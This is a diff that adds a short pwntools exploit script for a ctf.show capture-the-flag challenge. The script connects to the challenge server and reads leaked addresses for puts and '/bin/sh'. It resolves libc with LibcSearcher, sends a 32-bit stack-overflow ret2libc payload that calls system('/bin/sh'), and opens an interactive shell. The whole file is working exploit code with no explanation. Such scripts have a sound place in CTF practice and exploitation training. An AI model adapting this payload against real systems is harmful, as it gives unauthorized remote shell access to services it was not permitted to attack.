@@ -1,0 +1,16 @@
+from pwn import *
+from LibcSearcher import *
+context(arch = 'i386',os = 'linux',log_level = 'debug')
+#io = process('./pwn')
+io = remote('pwn.challenge.ctf.show',28200)
+elf = ELF('./pwn')
+io.recvuntil("puts: ")
+puts = eval(io.recvuntil("\n" , drop = True))
+io.recvuntil("gift: ")
+bin_sh = eval(io.recvuntil("\n" , drop = True))
+libc = LibcSearcher("puts" , puts)
+libc_base = puts - libc.dump("puts")
+system = libc_base + libc.dump("system")
+paylad = "a"*(0x9c+4) + p32(system) + p32(0) + p32(bin_sh)
+io.sendline(paylad)
+io.interactive()
